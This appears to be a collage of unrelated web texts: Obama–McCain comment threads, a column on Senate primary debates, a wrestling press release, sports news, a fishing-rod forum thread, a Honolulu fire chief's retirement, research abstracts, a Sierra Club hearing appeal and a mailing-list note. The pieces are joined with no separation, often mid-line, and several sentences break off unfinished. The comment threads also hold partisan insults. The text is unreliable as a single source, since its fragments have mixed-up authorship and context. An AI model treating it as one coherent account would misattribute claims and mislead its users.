I like the fact that Obama RE-thinks as circumstances change.
McCain doesn't even THINK. All that hot-head temperamental old man can do is bomb bomb bomb war war war kiss bush butt kiss bush butt, etc.
OBAMA 08!
he's someone who takes all the information at hand and can make an informed, intelligent decision about what is best for our country.
OBAMA 08!
Obama lies once again.
YES WE CAN AND WE WILL VOTE NOBAMA
PUMA (PAC)
Didn't Obama's staff clear this business up on CNN the other night? CNN haven't you learned from your reckless report over him snubbing a child asking for a fist bump the other day? Report the news, leave the tabloid, sensationalist journalism to Fox.
The media is like a bunch of dumb crows. Obama made it clear months ago that if troops lives were in danger he would slow the with draw. Not change the mission to leave. 16 months out is his mission. Is it 100% sure? Nothing in life is 100% sure other than death.
It might be a couple of extra months if we hit pockets in the withdraw that put our troops in harm's way. Anything other would be crazy. He said the same thing in the debates with Clinton as he has said now. His plan has not changed. Stop caing like dumb crows.
This is what a president should do...think out the math and if the equation does not add up make changes as necessary...not be stuck like McCain and his bomb bomb bomb appraoch!...
Obama said over and over today 16 months is the mission. Dumb crows. It's like you are deaf and delete that fact on purpose.
caw caw.. flip-flop caw caw can't hear just repeat echo chamber spin. caw caw
Why does the media always try to force public figures to make blanket statements on flexible subjects? Now I know why they liked "line in the sand" Bush the Decider.
I hope he does not change his mind regarding the phase withdraw. That is his most fundamental policy, He better not "refine" it. Go Obama 08
Barack will do what is necessary to bring our wonderful military home safely. He has not changed his time line but after he goes again he will do what is best. That's not a flip flop, it changing your mind to fit the situation.
McCain is trying to make it look like he is training Barack. McCain is kind of like Matt Lawler on ABC – "Where in the world is John McCain"!
This man has reversed ALL his positions since the primary.
He is the typical, lying, hypocritical politician.
Just slicker and sleazier than most.
And he has the race card playing advantage.!
What hasn't he back peddled and changed on?
He just changes his position depending on whose votes he is trying to win.
He panders to the left wing, and the evangelicals, the pro-war and the anti-war crowds.
What we don't know is what will this candidate actually DO when he is in the white house?
No track record, no experience, no resume, no qualifications- just a lot of hot air.
CHANGE apparently means CHANGE YOUR MIND...
Why do dems feel they have to sell out their principles in order to get elected...Obama promised to be a different politician, specifically one that doesn't pander or just says what the people want to hear....and now he is just appearing to be THAT politician, not just on Iraq which really isn't a change of policy but with all other positions that he has shifted on just this week...is this his idea of unity and non-partisanship? throwing the baby out with the bath water??
He changed his position on his lifelong mentor and friend, Rev Wright, he left the Church when it was no longer politically expedient for him, he changed on NAFTA, FISA, campaign finance reform and every other position he pushed to win the primary.
This man does not have the courage of his convictions... he blows in the winds of change... anything to get a vote.
I love the lengths Obama supporters will go to keep the kool-aid down. The man made a big point his opposition to the war, he was against the surge and now he's talking about changing his policiies based on the facts on the ground. Those facts have been there a long time, but News coverage has just started to follow it. People are so desperate for improvement that they'll follow anybody who gives a shiny smile. I don't support the war or think McCain is that great but Obama supporters are nuts.
This man is so smart... he never holds to any position.
If it will cost him any votes...he drops it like a hot potato.
if it is unpopular...he nixes it.
If it is not well received he ditches it.
if it invites scrutiny or criticism he dumps it.
All he does is change his mind depending on what is selling at the moment. What will he do as president... He is clearly afraid to take and hold any position or stand.
No conviction whatsoever, this man of hope and change.
Why shouldn't he be called on this? He preached the 16-month timeline throughout the primary season, and now he's "refining" his statements. It seems to me that some folks might have voted for him in the sate primaries based on his aggressive withdrawal promise. Now that he's changed that promise, can those people have their vote back?.
obama is starting to talk and act like dubya, who's never wrong......makes sense considering the obama lemmings have acted like dubya's supporters for months now....
Oh god forbid he do something smart like be fluid about the iraq withdrawl situation, i mean we'd want him to wrecklessly pull all the troops out without considering events as they happen! right? i don't think he ever meant the idea of 16 months to be right on the freaking dime! would common sense be too much to ask from the news media?
No, he is not smart he said at the beginning they would come home within 16 months without havent ever been there. That is called apeasement just like he did with NAFTA to win votes. All I can do is laugh "Hope" "Change" "Different Politics"
Same old same old but the sheep have made up there minds no matter what this clown says you will say he is right. Start McCain bashing from the uneducated in 3.....2.....1.......
SAD, VERY SADToo much ado about debates?
Do debates really matter? Photo by Mark Wilson/Getty Images
Over the weekend, there were three debates in two of the most hotly contested Democratic Senate primaries in the country.
Colorado Sen. Michael Bennet and former state House Speaker Andrew Romanoff squared off Friday night while Arkansas Sen. Blanche Lincoln and Lt. Gov Bill Halter debated on both Friday and Saturday.
In the wake of the tete a tetes, each campaign trumpeted its victory. An example: "Both Arkansas and national reporters agree -- Bill Halter (and Arkansas working families) were the clear winners in today's debate in front of the Associated Press statewide editors," crowed Halter's campaign.
Look deeper though and it becomes clear that the universe of people watching these debates is minuscule and, therefore, it's difficult to attach too much political significance to any one of them.
In Colorado, the debate was taped Friday night and ran Saturday on one local television station in the middle of a blizzard. In Arkansas, the Friday night debate was broadcast on a single local station while the Saturday square-off was not covered live by any television station in the state.
The simple fact is that the teeny audiences for these debates mean that their influence is naturally limited. By and large, the people who watch (or attend) these sorts of debates are either a) partisans who already their mind made up about who they support or b) reporters for whom debates provide a useful angle on which to write about a race. (The Fix pleads absolutely guilty on the second count.)
Does all that mean that all debates are meaningless? Absolutely not.
Debates that have wide statewide television coverage -- and happen in close proximity to the actual primary or general election vote -- can matter hugely in determining results.
Look no further than the Massachusetts Senate special election for evidence of the impact a debate can have. Eight days before the vote, Scott Brown was still regarded as a longshot when he and state Attorney General Martha Coakley squared off.
Brown's stellar debate performance, which was broadcast live across the state and moderated by David Gergen, catapulted the little-known state senator not only into the national limelight but also put him on the radar of many Massachusetts voters who were paying scant attention to the race prior to the debate.
(Another example of this phenomenon: The rise of Nick Clegg in the British elections. Clegg's performance in the first debate, which was broadcast live across the country, turned a two-person contest between Gordon Brown and David Cameron into a legitimate three-way race.)
The other way that debates -- even those with tiny viewership relative to the number of voters in any election -- can matter is if they create windows of opportunity for underdog candidates to make up ground.
The best, recent example of that came in late October 2007 when, in a debate at Drexel University, then Sen. Hillary Rodham Clinton -- then the clear frontrunner for the Democratic presidential nomination -- stumbled over a question of whether she thought.
So, debates can matter. But, the reality is that most don't simply because the audience is not only small but unrepresentative of the broader electorate.

Sorry, I'm confused by the significance of the emphatic phrase "in the middle of a blizzard." Depending on the technology, TV may still be viewable in a blizzard -- and we just saw the two February blizzards save the day for NBC in hugely boosting viewership for the Winter Olympics throughout much of the country. It's literally a case of a captive audience. Wouldn't viewership be far less on a balmy spring evening? Wouldn't a blizzard boost ratings?

Seriously though, Gallenod, you're right that one need not even open his mouth in order to provide copious material for attack ads. My earlier statement was something of an overgeneralization. Naturally, body language is just as important as a verbal gaffe, because it allows one's opponents to attack without having to worry about any pesky facts getting in the way.
I remember back in the summer of 2008 when it was all over but the shouting in the Democratic presidential primary, a fervent Hillary Clinton supporter on this board tried to use a one-millisecond televised shot of Michelle Obama's facial expression while Clinton was talking as evidence against voting for Barack Obama. Because you just can't, in good conscience, vote for a candidate married to someone who may have, for a split second, sported a look that could be interpreted as anything other than respectful.

37thand0street's got a good point here -- you might obliterate your opponent in the debate and barely have anyone notice, but say something stupid and you're never going to hear the end of it. That's definitely one of the reasons why debates matter, as depressing as it is -- it's an opportunity to find more material to go negative on one's opponent.
I was going to tack on "when one does not have any accomplishments of one's own to tout" at the end of that last sentence, but anymore, even if one candidate does have a long list of accomplishments to tout, he will still go negative eventually because negative campaigning is a proven election-winner at anything above the local level.

DEBATES
The debates are full of minefields - if a candidate gives a good performance - and makes good points - the low television viewership insures that few will see it.
HOWEVER - make a gaffe or say something like the Soviet Union does not dominate Eastern Europe -
AND EVERY TV STATION WILL PLAY THAT GAFFE OVER AND OVER AND OVER AND OVER AGAIN.
They will wait a few days, and play it again.
Then again.
And when the election comes, they will play it a few more times.
Do you think that the closing of the polls on election will stop them from playing it again.
No, they will show the gaffe again the next day -

Sadly, since the parties wrested control of the presidential debates from the League of Women Voters, most of what we've seen at the subsequent presidential debates have been dueling talking points sometimes accompnanied by personal gaffes (checking watches, yawning, eye-rolling, etc.)
Most politicians do not want debates that include any form of personal risk or include moderated fact-checking and follow-up questions. While it is reasonable to expect a chance to review and prepare for debate topics in advance, and even see a list of the initial questions, candidates who place restrictions on topics, questions, or follow-up questions (of either party) go to the bottom of my list of acceptable candidates.
Debates can be useful, but only if they're debates, not highly-staged joint appearances.

I think they matter when people don't have hard formed opinions. They probably mattered in Brown v Coakley since she came across as wooden and he did well. Many people didn't really know about Brown, so he had a lot of room to grow.
Another example of this is Obama vs McCain. Obviously everyone knew who Barack Obama was at that time, but there were a lot of people who didn't really know much about him. He was still new to the political scene and really hadn't started to campaign in earnest until September. McCain was leading Obama in the polls until the two started debating. People got to see Obama in his element for the first time and Obama started crushing McCain in the polls soon after. I think there were three elements in Obama's late surge. One was the Lehman Bros collapse. Dems are typically more trusted in these types of crises. The second was the outing of Palin in a series of disasterous interviews with Gibson and Couric. She simply couldn't be trusted to be a heartbeat away from the Presidency. This pick reflected poorly on McCain. The third factor in Obama's surge was the debates. People got to see Obama for the first time and saw how he handled himself (and saw how McCain handled himself too. He made the opposite impression)
The pundits loved to declare how McCain won the debates, but it was clear the public favored Obama's performance.
I think any election with relative unknown has the chance to be affected by debates. They provide some of the rawest, unscripted insight into a politician that you might never see. And in this youtube era, people don't need to watch the debate live to be affected. A strong or weak or gaffe filled performance can travel by word of mouth and people will eventually see.

Debates aren't pivotal except for the most superficial reasons. McCain didn't lose to Obama because he failed to make coherent points, he lost to Obama because he acted like a spoiled adolescent. Yeah that was useful information, and it was germane, but not every debate is going to pivot that way. McCain could have been courteous and just as incoherent and many would have said he did a great job.
Most voters aren't smart enough to follow a real debate not couched in simple applause lines, and too many people who are smart enough are just going to root for their candidate.
And when people can watch Palin/Biden and think that the village idiot won over the elder statesman, the whole thing is useless.NCAA And National Wrestling Hall Of Fame And Museum To Spotlight The Native American Wrestling Experience At Championships
March 5, 2010
STILLWATER OK...The NCAA and the National Wrestling Hall of Fame & Museum (NWHOFM) are featuring a tribute to The Native American Wrestling Experience during this year's 2010 NCAA Division I Wrestling Championships in Omaha, Neb.
"We are extremely excited to be able to bring awareness to the wrestling community on the many contributions the indigenous peoples of North America have woven into the sport's evolution," said Lee Roy Smith, executive director of the National Wrestling Hall of Fame and Museum. "We have assembled a group of Native Americans who have excelled in the sport and in life to participate in an exciting program that fans will not want to miss."
NCAA Fan Festival emcee Don Blasingame will engage former NCAA wrestling champions Ray Miller, Mark Branch, Principle Chief of the Cherokee Nation Chad Smith, and several more Native American panelists. This presentation will take place from 5 - 6:15 p.m. Central on Thursday, March 18, on the main stage of the NCAA Fan Festival in Exhibit Hall C of the Qwest Convention Center. Admission to the NCAA Fan Festival is free.
The Hay-Lush-Ka Singers and Dancers from the Winnebago Tribe of Nebraska will provide live entertainment before and after the program, and an autograph session with the panelists will take place immediately following the presentation.
All attendees at the Native American Wrestling Hall of Fame Presentation will receive a free 2010 NCAA Division I Wrestling Championships poster prior to the autograph session.
In conjunction with the presentation, the NWHOFM will have The Native American Wrestling Experience exhibit on display at the NCAA Fan Festival throughout the championship event.
The NWHOFM has published a book for the exhibit entitled The Native American Wrestling Experience: A Quiet Contribution. The 44-page booklet, authored by Roger Moore, features several wrestling legends that have been passed along for generations within the Native American culture.
The book also sheds light on the personal stories of those individual Native Americans who have excelled in the sport of wrestling, as well as providing an outline for the exhibit.
The NWHOFM will also be hosting its annual Champions Reunion in Room 213 of the Qwest Convention Center immediately following the first session of competition on Thursday, March 18. All former NCAA Champions, USA Olympians and Hall of Fame members are invited to engage in fellowship with fans and each other before the Native American Fan Fest program.
Advanced reservations are required for the Champions Reunion. Anyone interested in attending the reunion, or in purchasing the book on Native American Wrestling can contact the NWHOFM at 405/377-5243 or online at.
In addition to The Native American Wrestling Experience, the NCAA Fan Festival will feature other wrestling exhibit booths, displays, memorabilia, interactive games, souvenirs, and food and beverage sales.
Other NCAA Fan Festival events scheduled for Thursday, March 18, include free access to the USA Wrestling team practice and an autograph session with Wrestling Hall of Fame inductees Pat Smith, Ed Banach, Gray Simons, Olympian Brad Vering and former NCAA national champion Dave Martin. These five individuals represent former NCAA national champions from the past five decades.
The 2010 NCAA Division I Wrestling Championships will take place March 18 - 20, at the Qwest Center Omaha in Omaha, Neb.

Anchor Vanessa Flowers was proud to accept two awards on behalf of the station’s efforts in the fight against cancer.
ACS Director of Communication Mike Lefler presented 10/11 with the “Media Partner of the Year” award. “No media outlet in the state has provided ACS with more cancer-related stories,” said Lefler. “Our partnership to promote Relay For Life and Making Strides Against Breast Cancer in Lincoln is an extremely valuable way to help promote our events. Throughout the past year, 10/11 has helped the American Cancer Society make a huge impact in the fight against cancer right here in Lincoln and across the state.”
10/11 was also one of a handful of Nebraska media outlets who were given the “Spirit of Hope” award for providing more than $20,000 in in-kind sponsorship. 10/11’s in-kind sponsorship included Public Service Announcements (PSAs) for Relay for Life and Making Strides Against Breast Cancer, which were produced and aired by 10/11. Anchor Vanessa Flowers served as co-emcee for both the Relay for Life and Making Strides Against Breast Cancer events in 2011.

NEW YORK (WFAN) — Eli Manning and Antrel Rolle won’t make excuses for the Giants failing to make the playoffs this season. But they do like the fact that the team is playing hard with nothing to play for.
Joining WFAN’s Joe Benigno and Evan Roberts in separate interviews on Monday, Big Blue’s starting quarterback and stud safety said they are not pleased that their season will end next weekend, but they do take a measure of solace in the fact that at 0-6 they managed to go 6-3, including Sunday’s 23-20 overtime win in Detroit.
“We were used to winning the close games, but this year we just didn’t have it,” Manning said. “It’s those few close games that can make the difference. We easily could have been 3-3 after the first six games. It has been tough, but we’ve hung in there, made adjustments and won a few games.”
Rolle agreed, adding he liked the character the Giants showed in Detroit after performing horribly in a shutout loss at home the week before to Seattle.
“I know my team. I know the guys we have in the locker room. I know the organization. I know the coaching staff. We weren’t going to lay down,” Rolle said. “Last week’s performance against Seattle was a very, very bad performance. I wasn’t happy. I’m sure a lot of guys weren’t happy. We came back and showed we are going to be resilient; we are going to fight no matter what we have at stake.”
The Giants will conclude the regular season Sunday at home against Washington, a team they should beat. Rolle said the idea is to finish strong, show respect for the organization and head coach Tom Coughlin.
“The only satisfaction I get later in the season is playing in the postseason and obviously we don’t have any shot of doing that. But we still go out there and evaluate every game as it is,” Rolle said. “We can’t worry about the season because nobody put us in this hole but ourselves.”
With nothing to play for it may be smart to sit regulars during the season finale just to avoid any freak injuries, but Manning said he’ll be out there for the guys next to him. The 10-year veteran also needs 334 passing yards for his fourth 4,000-yard season, which might take some of the sting out of throwing an NFL-high 26 interceptions so far this season.
“I want to be there for my teammates. We got a lot of guys that play hurt … It’s the last game of the season and everyone’s hurt and they are out there competing and practicing and I want to be out there with them,” Manning said.

PDA : Best way to inscribe? dirtycamprunner05-23-2005, 11:02 PMI'm having a hard time inscribing a graphite rod. I've built several others for myself, but this is for a young man, and I want it to look good. Every method--rolling ball markers, pen and ink--seem to leave to wide a letter. Seems like since the ink can't be absorbed it just puddles on the surface. The result is wide letters. How do I get nice thin letters? I do abrade the surface with wet sandpaper first, but still no luck. All help would be appreciated. t_richerzhagen05-24-2005, 11:15 PMTo Bob Meiser, a sponsor and a professional rod builder.

Nooksack Mac06-02-2005, 02:11 AMI've never found a pen point, even the Extra Fine designations, that would write as fine a line as I see rod inscriptions produced routinely. However, a long time ago I found a way to produce a very fine line inscription. I used a sharp point bodkin (a large, sharp needle should also work) and carefully wrote/dug the script lettering into the surface of the graphite blank, then wiped away the dust. Of course, you have to write slowly and carefully, as there's no erasing mistakes. Then I smeared gold paint into the lettering, with the little brush in the bottlecap, and immediately swiped away the excess with a rag. The script lines stood out nicely, gold-filled. Then, of course, I covered it with rod finish. It still looks good over twenty years later. baldmountain06-02-2005, 07:45 AMThanks! I contacted Bob Meiser, and he clued me in.

We Love Pet MedsThe retiring chief plans to get more involved in his church
POSTED: 01:30 a.m. HST, Nov 03, 2012
LAST UPDATED: 01:32 a.m. HST, Nov 03, 2012
Honolulu Fire Chief Kenneth Silva is ending his 31-year career of saving lives to begin one of saving souls.
The 52-year-old said he's already in "the helping business," and plans to take on a greater role in his church, possibly even becoming a pastor with New Hope Christian Fellowship, where he has a close relationship with founding pastor Wayne Cordeiro.
After nearly seven years as fire chief, Silva said he announced his retirement Friday, before the mayoral election, because he did not want people to speculate he was leaving due to a new mayor taking office Jan. 2. Silva will retire Dec. 31.
On Jan. 18, 2006, Silva became the second Honolulu fire chief to be appointed by the Honolulu Fire Commission, which he says "took the politics out" of the process. Prior to Silva's predecessor, Attilio Leonardi, the mayor had appointed Honolulu's fire chief.
Silva said he is retiring now because he's maxed out his pension benefits after 31 years with HFD, and to answer the question, "What is it that I want to dedicate the rest of my life to?"
During Silva's tenure as chief, and following years of his testimony before lawmakers, an Oahu ban on most consumer fireworks became law, first taking effect for the 2011 Fourth of July holiday.
Under Silva the department got its first fire engines with compressed-air foam fire-suppression systems and developed an all-hazards incident management team.
Silva said he will leave with "feel-good memories" of relationships with fellow firefighters and recollections of helping people in need.
But it is the 1999 Sacred Falls rockfall tragedy — which left eight dead and dozens injured, and in which he served as incident commander — that he cannot forget.
"That was the largest mass casualty incident in our department's history," he said. "Being able to mitigate that incident, to this day, it sticks in my mind."
The Honolulu Fire Commission will work with the city Human Resources Department to begin the process of selecting the next fire chief.
Silva said he would like to see the department continue to maintain its accreditation and to continue HFD's training and certification program for its personnel.
His departure has nothing to do with a city Ethics Commission investigation into the 2010 award of a $175,000 consultant contract to Emergency Services Consulting International that recommended the merger of the Fire Department and Emergency Medical Services, said department spokesman Terry Seelig.
Silva, who serves on the board of directors of the International Association of Fire Chiefs, supports a merger. "I believe that fire-based EMS is what's best for our community," he said.
The consultant that was awarded the contract is the for-profit arm of the International Association of Fire Chiefs, Seelig said.
Allegations that Silva received gifts of travel as a member of the association's board are inaccurate, said Seelig. They were reimbursements of money spent to attend business meetings, he said.
<t$>Ethics Commission Executive Director Chuck Totto said the city will continue its investigation regardless of Silva's retirement but could not discuss the details.All right, Boston Celtics fans!

We present evidence that reassigning tasks among agents can alleviate moral hazard in communication. A rotation policy that routinely reassigns loan officers to borrowers of a commercial bank affects the officers' reporting behavior. When an officer anticipates rotation, reports are more accurate and contain more bad news about the borrower's repayment prospects. As a result, the rotation policy makes bank lending decisions more sensitive to officer reports. The threat of rotation improves communication because self-reporting bad news has a smaller negative effect on an officer's career prospects than bad news exposed by a successor.

Final Anti-Discrimination/Equality Frontier: Promote Stupidity
Our society probably has ‘advanced’ sufficiently in the past four decades to recognize that onetime U.S. Senator Roman Hruska actually was onto something and just ahead of his time in his widely disparaged support of a less than stellar appointee to the U.S. Supreme Court.
The appointee was one G. Harrold Carswell, who Richard Nixon, bitter over the rejection of an earlier appointee, tried to put on the court in 1970. Mr. Carswell was recognized as being a good many lumens shy of being the brightest bulb in a very low drawer.
In defending the ultimately unsuccessful appointment, Senator Hruska, in a statement for which he was widely reviled, proclaimed that the nation’s mediocre lawyers deserve to be represented on the bench of its highest court.
It’s now time to pick up the good senator’s fight against one of the last vestiges of discriminatory denials of equality. The relic is one that adversely impacts half of the nation’s people based solely upon their shared inherent trait – stupidity. Our motto should be:
Up With the Stupid
After all, almost nobody chooses to be stupid. It’s not their fault. As was said in the fight for equal treatment for homosexuals, it’s who they are – they're born the way they are.
Half of the nation’s people are, by definition, less than or just average in their cognitive abilities. They are not responsible for being intellectually deficient . . . and let’s not use that term. We instead should refer to them as being intellectually challenged and give them a leg up.
They deserve equal treatment.
They deserve equal treatment.
It is time to institute a program to ensure that people at every level of the span of intellectual capabilities in the nation’s population are fairly represented at every level in all of its institutions – at every level in business and financial organizations, the professions, academic institutions (among both students and faculty), the sciences and in scientific research, our courts, etc. This, of course, will require drafting people higher on the scale to replace a good many of those currently in our government . . . but let’s not get bogged down in minutia at the outset.
The point is to be fair.

Indian captain Mahendra Singh Dhoni today lauded his spinners and batsman Ambati Rayudu for his side’s six-wicket thrashing of England in the third cricket one-dayer to take an unassailable 2-0 lead in the five-match ODI series here.
The Indian spinners, led by Ravichandran Ashwin (3/39), shot England out for a modest 227 before Rayudu top-scored with an unbeaten 64 to fashion an easy victory over the home side.
“The spinners did it for us. Ashwin and (Ravindra) Jadeja did really well, but it was also Raina’s spell after Mohit’s injury,” Dhoni said after the match which India won with 42 balls to spare.

It became clear to me that the authors of the > Constitution had disagreements with the libertarian philosophy. They also had disagreements with one another about the role and power of government. Alexander Hamilton, for example, had serious disagreements with Madison and Jefferson, and advocated a much more powerful state than the others. Although he was clearly a proponent of liberty, he didn't think a strong central state necessarily conflicted with the concept of liberty. He also established a central bank, which I don't think libertarians generally agree with. Another clear evidence that the framers of the constitution were not in agreement with modern libertarians is the divergence on the matter of taxes. Libertarian philosophy equates taxes with robbery, more or less. I.e. no individual our group of individuals can compel you to give up your property, the government only has the powers that can be delegated by individuals, so the government doesn't have the right to take your property. Yet, the constitution clearly provides for taxation. Eminent domain would be considered robbery as well, yet the fifth amendment illustrates that the framers viewed it as a legitimate government power. Jefferson himself embarked upon a campaign to provide citizens with public education free of charge. This would, of course, be paid for by government, although I believe he was working in the context of the Virginia state government. In fact, he considered the University of Virginia one of his greatest achievements. According to libertarian thought, stealing money from people to pay for education would be immoral. Anyway, libertarianism isn't quite what its proponents claim it to be when they start talking about constitutionalism. It's sort of a reimagining of what they'd like the constitution to be about based on classical theories of government held by *some* of the founders and modern capitalist economic theory, and maybe a bit of Objectivism thrown in. --Levi2010 Chevrolet Equinox Questions

Tonight at the Broad Art Museum, there’s a celebration of all this local innovation and entrepreneurialism. The event, called LAUNCHED, is in its fifth year. But this is the first year they’ve partnered with The Hatch, a student-business incubator in East Lansing, to hand out $10,000 in seed money to one local start-up. Nick Chilenko is the co-founder of the event and founder of Nicholas Creative, a local web design firm. Jeff Smith is the director of the new economy division at the Lansing Economic Area Partnership. The pair joined Current State to discuss the event.

Drawing 50 producers and allied industry representatives to the farm, the event was described as an “exceptional success” by AHDB Pork’s technical innovation manager, Charlotte Evans.
“We started the day at Ribby Hall where David had the chance to introduce his business to the group,” she said. “We then kitted up to adhere to the biosecurity measures and headed off to the unit where the group was split into four and taken on a guided tour of the holding, focusing on farrowing, growing, finishing and service.”
Back at Ribby Hall, group members were given the opportunity to openly discuss what they considered to be the biggest on-farm challenges.
“There were lots of ideas put forward and, once everyone had their input, a shortlist was drawn up,” said Ms Evans. “The main issues were deemed to be: pre-weaning mortality, aggression in the weaners, sudden death in the finishers and water availability.
“We’ll now work with David and the relevant business stakeholders to implement measures to counteract some of these challenges.”
The plan is to come back together as a group on October 17, review progress and assess other areas of the business that may need support.
“I think it’s important that we get out on farm and learn from each other,” said Mr Goodier (pictured above). “So many of our European counterparts are doing this already and reaping the rewards of working together. I believe we should follow their lead.”

Chinese hackers are allegedly responsible for breaking into the computer systems of the U.S. Chamber of Commerce. ABC News reports:.
“I don’t think the Chamber of Commerce has anything worth stealing, but it’s part of a pattern of the Chinese stealing of everything they can, and that’s worrying,” Clarke said.
The hacking was carried out through “spear phishing,” in which victims are targeted with customized messages designed to look like they are from known contacts or relevant to specific topics. The Washington Post explains: hacking was first reported by the Wall Street Journal. The Wall Street Journal also reports that the attack has prompted some members of Congress to call for legislation boosting cyber security.JPMorgan Sells Largest ’Worst-of’ Structured Note This Year
JPMorgan Chase & Co. (JPM) sold $50.4 million of four-year notes tied to the least performing of two stock indexes and an exchange-traded fund, the largest “worst of” offering this year.
The securities, issued on Aug. 21, yield 8 percent a year as long as the Standard & Poor’s 500 Index, the Russell 2000 Index and the iShares MSCI EAFE ETF are all at least 60 percent of their initial value with all capital at risk, according to a prospectus filed with the U.S. Securities and Exchange Commission. The bank distributed the notes, which can be called in as soon as three months, for a 1.75 percent fee and estimated their value at 97 cents on the dollar at the time of sale.
Justin Perras, a spokesman for JPMorgan in New York, declined to comment.
Sales of worst-of notes have soared to $1.27 billion this year, 23 percent more than the $1.03 billion issued in all of 2012, according to data compiled by Bloomberg. The securities have become more popular as issuers look for ways to construct bonds with higher yields.
Correlation between changes in the Russell 2000 and iShares MSCI EAFE dropped to .75 this year from .83 for all of 2012, Bloomberg data show. The closer the correlation is to one, the more the prices of assets tend to move together.

Description/Abstract
Background: A metacognitive approach to the conceptualization of paranoia as a strategy for managing interpersonal threat has gained some support in studies of non-clinical populations. This study reports a clinical validation of the Beliefs about Paranoia Scale (BaPS), a self-report measure to assess metacognitive beliefs about paranoia. We aimed to replicate the factor structure of a brief version of the measure and test the specific hypotheses that positive beliefs about paranoia would predict levels of suspiciousness, and that negative beliefs about paranoia would predict problematic persecutory delusions.
Method: A total of 122 patients meeting criteria for a diagnosis of a schizophrenia spectrum disorder completed the questionnaire assessing beliefs about paranoia. In addition, 61 of the participants were administered the Structured Clinical Interview for DSM-IV, and 60 were administered the Positive and Negative Syndromes of Schizophrenia Scale. One hundred and seventy-eight non-patients were also recruited (an undergraduate sample).
Results: Principal components factor analysis showed that the three-factor solution was replicated (comprising negative beliefs about paranoia, paranoia as a survival strategy, and normalizing beliefs). This measure showed good internal consistency (alphas ranged from .85 to .91). Correlational analyses revealed that positive beliefs about paranoia were positively associated with levels of suspiciousness, and independent t tests showed that negative beliefs about paranoia were significantly higher in patients with a diagnosis of schizophrenia meeting criteria for persecutory delusions in comparison to those without. Analyses of covariance showed that patients scored higher than non-patients on both positive and negative beliefs, but logistic regression did not demonstrate that co-occurrence of these beliefs predicted patient status.
Conclusions: Three of our four hypotheses were confirmed, suggesting that a metacognitive approach to the conceptualization of paranoia as a strategy for managing interpersonal threat may have some utility for understanding clinical paranoia. Such a model is described and the clinical implications of the findings are also discussed.Choose Budget and enjoy great car rental rates worldwide.

Today, Michigan is losing the race to clean energy to almost 30 other states that have made the commitment to require clean, renewable energy at a faster rate and larger percent than our 10% by 2015 requirement. Michigan's largest electric utilities know that the cost of renewable energy is lower today than ever (in fact they've reduced the surcharges for renewable sources of power because it is so cheap!). But when it comes to increasing their investments in clean, renewable energy instead of dirty coal, natural gas and nuclear, they are choosing old, dirty energy instead of looking to make Michigan more competitive and desireable for the future.
But YOU can do something about this: The Michigan Public Service Commission (MPSC) is beginning the biennial review of Consumers Energy's Renewable Energy Plan, and will soon do the same with DTE Energy. The first step is a Public Hearing where YOU can offer comments and urge the MPSC to require Michigan's biggest electric utilities to adopt Sustainable Clean Energy Plans so that the people of our state are ready for the future!
MPSC Hearing on Consumers Energy Renewable Energy PlanWEDNESDAY, JUNE 26th - 9 A.M. Constitution Hall, 525 W. Allegan Street, Lansing, MI
You'll be able to provide comments to an Administrative Law Judge working on behalf of the MPSC to collect input on this issue. Can't make it? Take time to send a letter to the MPSC on this case below. There will be more chances to add input later on as well, and soon the DTE Energy case will also be up for public hearing and comment, so please follow this issue with us! The hearings are open to anyone, but if you want to make sure which utility serves your area you can check this map of electric service areas.
Contact Anne Woiwode at anne.woiwode@sierraclub.org or Jan O'Connell at jan.oconnell@sierraclub.org or (616) 956-6646, to learn more about the hearing. (To look at the electronic docket for the Consumers Energy Renewable Energy Plan biennial review, go to)
Dear [Decision Maker],
Thank you for taking my comments on Case No. 17301 - In the matter of the Application of Consumers Energy for Biennial Review of its Renewable Energy Plan. I urge the Michigan Public Service Commission to require Consumers Energy to adopt a Sustainable Clean Energy Plan for Michigan because this would protect public health, our air and water quality, produce good, clean energy jobs in Michigan, and safeguard our families and communities. In recent years the cost of coal in Michigan has increased significantly while renewable energy is declining in cost. Our over-dependence on outdated, dirty coal as an energy source has kept Michigan from competing and moving ahead, while Consumers Energy's customers struggle to pay ever-increasing electric bills. Meanwhile polluting coal plants continue endangering public health and our "Pure Michigan" way of life. In this challenging economy, Consumers Energy must move boldly and deliberately toward a clean energy future while ensuring that its customers are protected from costly electric bills. Electricity is an essential need, heats many homes and must be affordable for all Michigan families.

Bradford assistant manager Colin Cooper has quit the club after accepting a coaching position with Middlesbrough.
Last Updated: 08/09/11 5:26pm
Bradford assistant manager Colin Cooper has quit the club after accepting a coaching position with Middlesbrough.
Cooper, 44, arrived at Valley Parade in March as number two to Peter Jackson, who unexpectedly resigned two weeks ago.
Phil Parkinson was named as Jackson's successor last week and former Boro and Nottingham Forest defender Cooper accepted his offer to stay on at the club as his assistant, but has since opted for a fresh start.
Parkinson told the club's official website: "It's all happened pretty quickly this week to be honest. He's been made an offer, and it's one that he believes is too good to turn down. We would obviously have liked him to stay, but we have to respect his decision.
"I have to stay that Colin has been excellent with me since I've arrived at the club and I wish him all the best."
Cooper added: "I'd like to thank all the fans for their generous support throughout my time at the club, especially during the week or so that I was in charge after Peter left. I'd also like to wish Phil and the lads all the very best for the future.".Sergey 'DoubleF' Zaharchenko wrote: >>* sshd almost starves; it takes 0.00% (normally 2%) and only transfer >>several bytes once several minutes; the otherside scp prompts "stalled". >> >> > >sshd doesn't starve CPU, I guess; as you reach it through ppp, and ppp >gets slow, sshd does, too. > > > Sounds reasonable:) Things can hardly be perfect. Now I begin to use mpg123, I used your method of "rtprio up and su back", very useful to me. But if mpg123 has higher priority than ppp, sometimes mpg123 decides to move to another song, it reloads buffer, starveing ppp and timeouting bluetooth device... If mpg123 has equal/lower priority with ppp, they struggle for CPU, and that *sounds* bad. Now I adjusted buffer, it works so so. I read the handbook it says "no way to limit CPU percentage". It's my toy, a old P166M box, I let other people in the office ssh to the box with cmp3 console DJ (backended mpg123) to play music, because it has good speakers. I use ppp over bluetooth to connect to the box when I'm enjoying sun shine outdoor. The best way seems to buy a new one:)High Court SOX Case To Put Labor Department In Spotlight

Start at call number: PN3331 .B37 2007But according to the band--singer/guitarist Jim Atkins, guitarist Tom Linton, bassist Rick Burch, drummer Zach Lind--neither they nor the label was quite prepared for such a move. By their own admission, Jimmy Eat World didn't have enough strong songs to comprise what they felt would make a good album, and the label didn't seem to have much faith, either: Static Prevails was released in 1996 to a deafening silence. But the follow-up, 1999's Static, was a far better effort, and its single, "Lucky Denver Mint," began gaining airplay at college and alternative radio. If ever there was a time for the label to begin caring, this was it.
